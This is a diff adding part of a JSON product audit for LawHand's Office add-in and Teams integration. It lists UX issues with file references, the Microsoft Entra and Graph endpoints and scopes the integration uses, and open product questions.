+   "issue": "The pane never shows or lets the user choose the matter, so users cannot tell whether firm or matter knowledge is used (it is not).",
+   "severity": "medium",
+   "suggestion": "Add a matter chip or picker, suggested from the file name, sender or document properties.",
+   "quick_win": false
+  },
+  {
+   "screen": "Office ribbon (manifests)",
+   "file_ref": "office-addin/manifests/word-excel.xml:92-94",
+   "issue": "16, 32 and 80 px ribbon icons all point to the 96x96 PNG (the same in outlook.xml:72-74), so icons look blurry and fail Marketplace validation.",
+   "severity": "low",
+   "suggestion": "Ship correctly sized 16/32/80 (and high-DPI) icons.",
+   "quick_win": true
+  },
+  {
+   "screen": "Teams personal tab",
+   "file_ref": "frontend/src/pages/TeamsTabPage.jsx:29-50",
+   "issue": "The tab is only a launcher: Matters/Calendar open new browser tabs (target=_blank) and nothing about matters is shown in Teams.",
+   "severity": "medium",
+   "suggestion": "Show 'My matters and upcoming deadlines' inline and use Teams deep links or stageView instead of new browser tabs.",
+   "quick_win": false
+  },
+  {
+   "screen": "Teams channel tab",
+   "file_ref": "frontend/src/pages/TeamsTabConfigPage.jsx:71-77",
+   "issue": "The channel tab's content URL is the generic /teams page, not the linked matter (entityId=matterId is ignored), so every channel tab shows the same firm-wide list.",
+   "severity": "medium",
+   "suggestion": "Point contentUrl at /teams/matter/{id} and read app.getContext() channelId to show that matter's dashboard.",
+   "quick_win": false
+  },
+  {
+   "screen": "Teams tab config",
+   "file_ref": "frontend/src/pages/TeamsTabConfigPage.jsx:141-167",
+   "issue": "The selects have no labels (placeholder options 'Team'/'Channel'/'Matter'). An object error detail renders as '[object Object]' (line 80) because the page does not use teams/teamsErrors.errorText.",
+   "severity": "low",
+   "suggestion": "Add <label>s and use errorText() like TeamsPanel does.",
+   "quick_win": true
+  },
+  {
+   "screen": "Teams tab config",
+   "file_ref": "frontend/src/pages/TeamsTabConfigPage.jsx:128-137",
+   "issue": "'Teams permissions required' shows a bare Connect button with no explanation of scopes or who must consent, and non-admins are silently redirected away (App.jsx:352).",
+   "severity": "low",
+   "suggestion": "Explain the admin-consent need and show a 'Ask your LawHand admin' state for non-admins.",
+   "quick_win": true
+  },
+  {
+   "screen": "Admin > Integrations > Teams",
+   "file_ref": "frontend/src/components/TeamsPanel.jsx:149-190",
+   "issue": "Nowhere does it say how to install the LawHand Teams app or Office add-in; the only guidance lives in repo docs.",
+   "severity": "medium",
+   "suggestion": "Add an 'Install in Microsoft 365' section with package and manifest downloads and Integrated Apps steps.",
+   "quick_win": true
+  }
+ ],
+ "api_surface": [
+  {
+   "provider": "Microsoft Entra (NAA via MSAL nestable client)",
+   "endpoint": "acquireTokenSilent/Popup for api://<OFFICE_ENTRA_CLIENT_ID>/office.access",
+   "file_ref": "office-addin/src/auth/officeSession.ts:55-66",
+   "method": "MSAL",
+   "purpose": "Get a delegated token for the LawHand API to exchange for a session",
+   "scope_needed": "office.access (custom delegated scope)"
+  },
+  {
+   "provider": "LawHand API",
+   "endpoint": "/api/auth/office/exchange",
+   "file_ref": "backend/app/routers/auth.py:1716-1797",
+   "method": "POST",
+   "purpose": "Verify the Entra token (aud/scope/tid/oid) and set LawHand cookies",
+   "scope_needed": "office.access; user must already be a linked Microsoft LawHand user in a pilot tenant"
+  },
+  {
+   "provider": "LawHand API",
+   "endpoint": "/api/office/plans",
+   "file_ref": "backend/app/routers/office_assistant.py:66-84",
+   "method": "POST",
+   "purpose": "Generate a one-action Office plan through the LLM",
+   "scope_needed": "OFFICE_ASSISTANT_ENABLED plus pilot allowlist"
+  },
+  {
+   "provider": "LawHand API",
+   "endpoint": "/api/office/plans/{plan_id}/result",
+   "file_ref": "backend/app/routers/office_assistant.py:87-113",
+   "method": "POST",
+   "purpose": "Metadata-only apply/reject/stale/failed audit",
+   "scope_needed": "same gate"
+  },
+  {
+   "provider": "Microsoft Graph",
+   "endpoint": "/me/joinedTeams",
+   "file_ref": "backend/app/services/teams.py:279-292",
+   "method": "GET",
+   "purpose": "List teams for the admin link UI",
+   "scope_needed": "Team.ReadBasic.All (delegated)"
+  },
+  {
+   "provider": "Microsoft Graph",
+   "endpoint": "/teams/{team_id}/channels",
+   "file_ref": "backend/app/services/teams.py:294-310",
+   "method": "GET",
+   "purpose": "List channels",
+   "scope_needed": "Channel.ReadBasic.All (delegated)"
+  },
+  {
+   "provider": "Microsoft Graph",
+   "endpoint": "/teams/{team_id}/channels",
+   "file_ref": "backend/app/services/teams.py:313-340",
+   "method": "POST",
+   "purpose": "Create a matter channel",
+   "scope_needed": "Channel.Create (delegated, opt-in)"
+  },
+  {
+   "provider": "Microsoft Graph",
+   "endpoint": "/teams/{team_id}/channels/{channel_id}/messages",
+   "file_ref": "backend/app/services/teams.py:401-406",
+   "method": "POST",
+   "purpose": "Post an HTML or Adaptive Card notification as the delegated user",
+   "scope_needed": "ChannelMessage.Send (delegated); Chat.ReadWrite and TeamsActivity.Send are also required but unused (teams.py:40-46)"
+  },
+  {
+   "provider": "Microsoft Entra",
+   "endpoint": "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
+   "file_ref": "backend/app/services/teams_voice.py:864",
+   "method": "POST",
+   "purpose": "App-only client-credentials token for call records",
+   "scope_needed": "https://graph.microsoft.com/.default with CallRecords.Read.All (application)"
+  },
+  {
+   "provider": "Microsoft Graph",
+   "endpoint": "/communications/callRecords/{id} and /communications/callRecords/getPstnCalls",
+   "file_ref": "backend/app/services/teams_voice.py:1008-1023",
+   "method": "GET",
+   "purpose": "Read inbound Teams Phone call metadata and reconcile against the PSTN usage report",
+   "scope_needed": "CallRecords.Read.All (application)"
+  },
+  {
+   "provider": "Microsoft Graph",
+   "endpoint": "/subscriptions (resource communications/callRecords)",
+   "file_ref": "backend/app/services/teams_voice.py:1054-1150",
+   "method": "POST/PATCH/DELETE",
+   "purpose": "Change-notification subscription for new call records",
+   "scope_needed": "CallRecords.Read.All (application)"
+  }
+ ],
+ "open_questions": [
+  "Has the Teams app ever been installed against production? If so, does Cloudflare or another layer rewrite X-Frame-Options/frame-ancestors for /teams? The repo nginx config would block framing.",
+  "Has the Office add-in ever been sideloaded end-to-end (docs/office-pilot-activation.md section 3)? In particular, did Word/Excel on the web or new Outlook sign in, given the SameSite=Lax cookie design?",
+  "Should the pilot confirm in a real Excel build that range.values with a leading '=' is written as a formula (Microsoft's Range.values documentation says it is), to size the set_selected_values bypass?",
+  "Product decisions still open in docs/office-document-assistant-plan.md:374-380: tracked changes mandatory? add-in access for non-Microsoft (Google/password) LawHand accounts? whole-document analysis?",
+  "What share of target firms license Microsoft 365 Copilot or Gemini Enterprise? That decides whether to build add-in-hosted Copilot skills (preview, unified manifest) before the Copilot Studio/MCP Matter Agent (ECO-09..12).",
+  "Should LawHand keep paying for generic LLM rewriting in the pane, or cede generic drafting to the client's Copilot in Word/Gemini in Docs and focus the pane on matter-grounded, deterministic actions (templates, clauses, filing, redline)?",
+  "Does the ESM @microsoft/teams-js 2.53 build in this bundle set window.microsoftTeams? If not, TeamsTabConfigPage never calls setConfig.",
+  "Should Chat.ReadWrite and TeamsActivity.Send be removed from TEAMS_REQUIRED_SCOPES now (forcing re-consent), or kept until activity-feed and chat features ship?"
+ ]
+}
